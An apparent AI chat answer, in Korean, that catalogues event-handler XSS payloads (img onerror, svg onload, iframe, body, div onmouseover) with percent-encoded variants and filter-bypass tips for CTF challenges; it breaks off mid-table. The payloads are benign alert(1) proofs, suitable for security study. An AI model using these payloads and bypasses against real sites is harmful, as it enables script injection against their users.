좋아요! `<script>` 없이도 **XSS를 실행할 수 있는 이벤트 기반 공격 기법**은 **CTF에서 매우 자주 나오는 주제**입니다. 아래는 그런 이벤트 기반 페이로드들을 **태그별로 정리**하고, **퍼센트 인코딩된 버전**도 같이 제공할게요.

---

## 🧨 이벤트 핸들러 기반 XSS (No `<script>`)

### 💡 개념 요약:

브라우저는 특정 HTML 태그에 이벤트 속성이 있을 때 자동으로 JS 코드를 실행합니다. 대표 이벤트 핸들러는:

| 이벤트           | 설명                  |
| ------------- | ------------------- |
| `onerror`     | 이미지나 리소스 로드 실패 시 실행 |
| `onload`      | 리소스 로드 완료 시 실행      |
| `onclick`     | 클릭 시 실행             |
| `onmouseover` | 마우스 오버 시 실행         |

---

## 🔥 대표 페이로드 예제

### 1. `<img>` + `onerror` (가장 흔함)

```html
<img src=x onerror=alert(1)>
```

퍼센트 인코딩:

```
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

📌 `src=x`는 로드 실패를 유도하여 `onerror`가 실행됨.

---

### 2. `<svg>` + `onload` (강력한 스크립트 대체)

```html
<svg onload=alert(1)>
```

퍼센트 인코딩:

```
%3Csvg%20onload%3Dalert(1)%3E
```

📌 SVG는 `<script>`가 막혀도 우회가 가능하며, 이미지처럼 삽입되기 때문에 필터를 우회하기 쉽습니다.

---

### 3. `<iframe>` + `onload`

```html
<iframe onload=alert(1)></iframe>
```

퍼센트 인코딩:

```
%3Ciframe%20onload%3Dalert(1)%3E%3C%2Fiframe%3E
```

📌 `<iframe>`은 CTF에서 흔히 쓰이지는 않지만, 렌더링이 허용된다면 사용 가능.

---

### 4. `<body>` + `onload`

```html
<body onload=alert(1)>
```

퍼센트 인코딩:

```
%3Cbody%20onload%3Dalert(1)%3E
```

📌 페이지 전체에 삽입되는 경우가 아니라면 거의 작동하지 않음. 하지만 SSR 기반 CTF에서는 등장 가능성 있음.

---

### 5. `<div>` + `onmouseover` (유저 상호작용 필요)

```html
<div onmouseover=alert(1)>XSS</div>
```

퍼센트 인코딩:

```
%3Cdiv%20onmouseover%3Dalert(1)%3EXSS%3C%2Fdiv%3E
```

📌 유저가 마우스를 올려야 실행되므로 일부 제한적이지만, 필터를 우회할 수 있음.

---

## ✅ 필터 우회 팁

| 기법            | 설명                       |
| ------------- | ------------------------ |
| 이벤트 핸들러만 사용하기 | `<script>`가 필터링돼도 작동     |
| 퍼센트 인코딩       | `<` → `%3C`, `>` → `%3E` |
| 속성값           |                          |
